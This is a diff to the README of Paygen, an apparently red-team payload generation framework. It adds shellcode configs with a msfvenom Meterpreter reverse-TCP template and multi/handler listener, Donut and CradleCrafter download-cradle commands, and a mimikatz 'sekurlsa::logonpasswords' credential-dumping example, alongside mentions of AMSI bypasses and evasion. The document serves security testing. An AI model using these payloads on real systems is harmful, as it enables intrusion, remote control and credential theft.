@@ -22,6 +22,7 @@ Paygen is a web-based payload generation framework for security researchers and 
 - 🌐 **Modern Web Interface** - Clean, responsive design with real-time validation
 - 📋 **Recipe System** - YAML-based payload definitions with rich metadata
 - 🔄 **Preprocessing** - Chain XOR/AES encryption, compression, encoding
+- 🎯 **Shellcode Configuration** - Centralized shellcode generation with reusable configs and automatic listener generation
 - 🔀 **Preprocessing Options** - Select between multiple shellcode generation methods (msfvenom, donut, custom)
 - 🎯 **MITRE ATT&CK** - Built-in tactic and technique mappings
 - 📊 **Effectiveness** - HIGH/MEDIUM/LOW evasion ratings
@@ -157,6 +158,114 @@ output:
 
 ---
 
+## Shellcode Configuration System
+
+Paygen includes a centralized shellcode configuration system that simplifies recipe creation and enables automatic listener generation.
+
+### Overview
+
+Instead of defining shellcode generation methods inline in each recipe, you can now define them once in `shellcodes.yaml` and reference them across multiple recipes. This provides:
+
+- **Reusability** - Define shellcode methods once, use in multiple recipes
+- **Cleaner Recipes** - No more nested option blocks with repeated parameter definitions
+- **Automatic Listeners** - Listener commands are automatically generated and inserted in launch instructions
+- **Type Safety** - Full parameter validation using the existing validation system
+- **Dynamic Parameters** - Shellcode-specific parameters appear dynamically in the GUI
+
+### Configuration File
+
+Create `shellcodes.yaml` in your paygen directory:
+
+```yaml
+- name: "Msfvenom Meterpreter Reverse TCP"
+  parameters:
+    - name: "lhost"
+      type: "ip"
+      description: "Attacker/C2 server IP address"
+      required: true
+    - name: "lport"
+      type: "port"
+      description: "Listener port"
+      required: true
+      default: 443
+  listener: "msfconsole -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j\""
+  shellcode: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
+
+- name: "Donut - EXE to Shellcode"
+  parameters:
+    - name: "executable_path"
+      type: "file"
+      description: "Path to the executable file"
+      required: true
+    - name: "executable_parameters"
+      type: "string"
+      description: "Command-line parameters"
+      required: false
+      default: ""
+  shellcode: "donut -i {{ executable_path }} -p \"{{ executable_parameters }}\" -a 2 -o /tmp/donut_payload.bin && cat /tmp/donut_payload.bin"
+```
+
+**Fields:**
+- `name` - Display name shown in the GUI dropdown
+- `parameters` - List of parameters (supports all types: ip, port, string, file, path, hex, bool, integer, choice)
+- `shellcode` - Command template using Jinja2 syntax (`{{ variable }}`)
+- `listener` - (Optional) Listener command template for automatic generation
+
+### Recipe Usage
+
+Use the `shellcode` preprocessing type in recipes:
+
+```yaml
+preprocessing:
+  - type: "shellcode"
+    name: "Select shellcode generation method"
+    output_var: "raw_shellcode"
+  
+  # Continue with other preprocessing steps
+  - type: "script"
+    name: "xor_encryption"
+    script: "xor_encrypt.py"
+    args:
+      data: "{{ raw_shellcode }}"
+    output_var: "encrypted"
+```
+
+**That's it!** The GUI will automatically:
+1. Load available shellcodes from `shellcodes.yaml`
+2. Display them in a dropdown
+3. Show shellcode-specific parameters when one is selected
+4. Validate parameters in real-time
+5. Generate the shellcode command
+6. Insert listener instructions if defined
+
+### Automatic Listener Generation
+
+When a shellcode configuration includes a `listener` field, it's automatically rendered and inserted at the top of launch instructions:
+
+```markdown
+# Listener
+
+```shell
+msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 443; set ExitOnSession false; exploit -j"
+```
+
+# [Rest of launch instructions...]
+```
+
+### Example
+
+See `recipes/shellcode_example.yaml` for a complete example using the new shellcode type.
+
+### Configuration Path
+
+Set the shellcode configuration path in `~/.config/paygen/config.yaml`:
+
+```yaml
+shellcodes_config: "~/Documents/Tools/paygen/shellcodes.yaml"
+```
+
+---
+
 ## Built-in Preprocessors
 
 Located in `preprocessors/`:
@@ -230,6 +339,11 @@ recipes_dir: "~/Documents/Tools/paygen/recipes"
 templates_dir: "~/Documents/Tools/paygen/templates"
 preprocessors_dir: "~/Documents/Tools/paygen/preprocessors"
 output_dir: "~/Documents/Tools/paygen/output"
+
+# Configuration files
+ps_obfuscation_yaml: "~/Documents/Tools/paygen/ps-obfuscation.yaml"
+ps_features_yaml: "~/Documents/Tools/paygen/ps-features.yaml"
+shellcodes_config: "~/Documents/Tools/paygen/shellcodes.yaml"
 
 # Build options
 keep_source_files: false
@@ -612,7 +726,26 @@ Defines AMSI bypasses and download cradles with optional obfuscation control.
   no-obf: true | false  # Optional, default: false
   code: |
     PowerShell code or template
+  # OR
+  command: |
+    Shell command to execute (output becomes the code)
 ```
+
+**Code vs Command:**
+
+Features can use either `code` or `command` field:
+
+- **code** - Static template with variable substitution
+  - Content is used directly as output
+  - Variables like `{url}`, `{args}` are replaced
+  - Conditional blocks `{if args}...{fi}` are processed
+  - No command execution
+
+- **command** - Dynamic generation via shell execution
+  - Command is executed, stdout becomes the code
+  - Variables are replaced BEFORE execution
+  - Useful for tools like CradleCrafter, Invoke-Obfuscation, etc.
+  - Errors show command and stderr for debugging
 
 **Types:**
 
@@ -658,6 +791,27 @@ The optional variables `{namespace}`, `{class}`, `{entry_point}`, and `{args}` a
 - `{entry_point}` - Entry point method name (e.g., "Main", "DllMain")
 - `{args}` - Command-line arguments for the payload (space-separated)
 
+**Conditional Blocks:**
+
+Variables can be wrapped in conditional blocks to avoid empty values in the generated code. Use the syntax `{if varname}content{fi}`:
+
+- If the variable has a value, the content is included (without the markers)
+- If the variable is empty or not provided, the entire block is removed
+
+**Example:**
+```yaml
+# Template with conditional args
+mimikatz {if args}"{args}"{fi} "privilege::debug"
+
+# With args="sekurlsa::logonpasswords":
+# Output: mimikatz "sekurlsa::logonpasswords" "privilege::debug"
+
+# Without args (empty):
+# Output: mimikatz "privilege::debug"
+```
+
+This avoids generating commands with empty quotes like `mimikatz "" "privilege::debug"` which could break functionality. Multiple consecutive spaces are automatically cleaned up to a single space.
+
 **Example - Basic HTTP Download:**
 ```yaml
 - name: IWR-IEX (Standard)
@@ -686,6 +840,22 @@ The optional variables `{namespace}`, `{class}`, `{entry_point}`, and `{args}` a
 ```
 
 This gives you full control over how the URL is constructed and how assemblies are loaded in each cradle template.
+
+**Example - Command-Based Cradle (CradleCrafter):**
+```yaml
+- name: CradleCrafter - PsComMsXml
+  type: cradle-ps1
+  no-obf: false
+  command: |
+    pwsh -Command "Invoke-CradleCrafter -Url '{url}/{output_file}' -Command 'MEMORY,PSCOMMSXML,REARRANGE,1' {if args}-PostCradleCommand '{args}'{fi} -Quiet"
+```
+
+In this example:
+- The `command` field executes `pwsh` with CradleCrafter
+- Variables `{url}`, `{output_file}`, `{args}` are replaced before execution
+- Conditional block `{if args}...{fi}` adds `-PostCradleCommand` only if args provided
+- The stdout from the command becomes the cradle code
+- If the command fails, error shows exit code, command, and stderr
 
 **no-obf Flag:**
 
